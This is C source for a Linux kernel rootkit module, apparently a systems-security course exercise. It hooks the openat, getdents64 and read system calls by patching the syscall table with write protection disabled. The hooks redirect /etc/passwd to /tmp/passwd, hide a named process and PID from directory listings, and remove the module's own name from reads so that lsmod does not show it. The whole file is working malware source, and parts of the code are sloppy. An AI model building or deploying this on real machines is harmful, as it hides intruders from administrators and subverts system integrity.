#include <asm/cacheflush.h>
#include <asm/current.h>  // process information
#include <asm/page.h>
#include <asm/unistd.h>  // for system call constants
#include <asm/unistd_64.h>
#include <linux/highmem.h>  // for changing page permissions
#include <linux/init.h>     // for entry/exit macros
#include <linux/kallsyms.h>
#include <linux/kernel.h>  // for printk and other kernel bits
#include <linux/module.h>  // for all modules
#include <linux/sched.h>
#include <linux/types.h>

#define PREFIX "sneaky_process"
#define PASSWD "/etc/passwd"

struct linux_dirent64 {
  unsigned long d_ino;      // inode number
  off_t d_off;              // offset to next structure
  unsigned short d_reclen;  // size of this strucutre
  unsigned char
      d_type;  // type of this structure e.g. normal file, socket, directory, ...
  char d_name[];
};

//This is a pointer to the system call table
static unsigned long * sys_call_table;

char * sneaky_pid = NULL;
module_param(sneaky_pid, charp, 0);

// Helper functions, turn on and off the PTE address protection mode
// for syscall_table pointer
int enable_page_rw(void * ptr) {
  unsigned int level;
  pte_t * pte = lookup_address((unsigned long)ptr, &level);
  if (pte->pte & ~_PAGE_RW) {
    pte->pte |= _PAGE_RW;
  }
  return 0;
}

int disable_page_rw(void * ptr) {
  unsigned int level;
  pte_t * pte = lookup_address((unsigned long)ptr, &level);
  pte->pte = pte->pte & ~_PAGE_RW;
  return 0;
}

// 1. Function pointer will be used to save address of the original 'openat' syscall.
// 2. The asmlinkage keyword is a GCC #define that indicates this function
//    should expect it find its arguments on the stack (not in registers).
asmlinkage int (*original_openat)(struct pt_regs *);

// Define your new sneaky version of the 'openat' syscall
asmlinkage int sneaky_sys_openat(struct pt_regs * regs) {
  unsigned long path_addr = regs->si;
  char * pathname = (char *)path_addr;
  if (strcmp(pathname, PASSWD) == 0) {
    copy_to_user(pathname, "/tmp/passwd", strlen("/tmp/passwd") + 1);
  }
  return (*original_openat)(regs);
}

asmlinkage int (*original_getdents64)(struct pt_regs * regs);

asmlinkage int sneaky_getdents64(struct pt_regs * regs) {
  unsigned long entryDirent = regs->si;
  int nread = (*original_getdents64)(regs), off = 0;
  printk(KERN_INFO "get sneaky getdents64 with process id %s", sneaky_pid);

  if (nread == 0 || nread < 0) {
    return 0;  // == 0 means nothing to read, and < 0 means error
  }

  for (off = 0; off < nread;) {
    struct linux_dirent64 * curDirent = (struct linux_dirent64 *)(entryDirent + off);
    if (strcmp(curDirent->d_name, "sneaky_process") == 0 ||
        strcmp(curDirent->d_name, sneaky_pid) == 0) {
      void * nextDirent = (void *)curDirent + curDirent->d_reclen;
      int remaining_size = nread - (off + curDirent->d_reclen);
      memmove(curDirent, nextDirent, remaining_size);
      nread -= curDirent->d_reclen;
    }

    off += curDirent->d_reclen;
  }
  return nread;
}

asmlinkage ssize_t (*original_read)(struct pt_regs * regs);

asmlinkage ssize_t sneaky_read(struct pt_regs * regs) {
  ssize_t nread = original_read(regs);
  char * buf = (char *)regs->si;
  char *start = NULL, *end = NULL;

  if (nread <= 0) {
    return nread;  // some error happen
  }

  if ((start = strnstr(buf, "sneaky_mod", nread)) != NULL) {
    if ((end = strchr(start, '\n')) != NULL) {
      end = end + 1;
      memmove(start, end, (buf + nread) - end);
      nread -= (end - start);
    }
  }

  return nread;
}

// The code that gets executed when the module is loaded
static int initialize_sneaky_module(void) {
  // See /var/log/syslog or use `dmesg` for kernel print output
  printk(KERN_INFO "Sneaky module being loaded.\n");

  // Lookup the address for this symbol. Returns 0 if not found.
  // This address will change after rebooting due to protection
  sys_call_table = (unsigned long *)kallsyms_lookup_name("sys_call_table");

  // This is the magic! Save away the original 'openat' system call
  // function address. Then overwrite its address in the system call
  // table with the function address of our new code.
  original_openat = (void *)sys_call_table[__NR_openat];
  original_getdents64 = (void *)sys_call_table[__NR_getdents64];
  original_read = (void *)sys_call_table[__NR_read];

  // Turn off write protection mode for sys_call_table
  enable_page_rw((void *)sys_call_table);

  // You need to replace other system calls you need to hack here
  sys_call_table[__NR_openat] = (unsigned long)sneaky_sys_openat;
  sys_call_table[__NR_getdents64] = (unsigned long)sneaky_getdents64;
  sys_call_table[__NR_read] = (unsigned long)sneaky_read;

  // Turn write protection mode back on for sys_call_table
  disable_page_rw((void *)sys_call_table);

  return 0;  // to show a successful load
}

static void exit_sneaky_module(void) {
  printk(KERN_INFO "Sneaky module being unloaded.\n");

  // Turn off write protection mode for sys_call_table
  enable_page_rw((void *)sys_call_table);

  // This is more magic! Restore the original 'open' system call
  // function address. Will look like malicious code was never there!
  sys_call_table[__NR_openat] = (unsigned long)original_openat;
  sys_call_table[__NR_getdents64] = (unsigned long)original_getdents64;
  sys_call_table[__NR_read] = (unsigned long)original_read;

  // Turn write protection mode back on for sys_call_table
  disable_page_rw((void *)sys_call_table);
}

module_init(initialize_sneaky_module);  // what's called upon loading
module_exit(exit_sneaky_module);        // what's called upon unloading
MODULE_LICENSE("GPL");
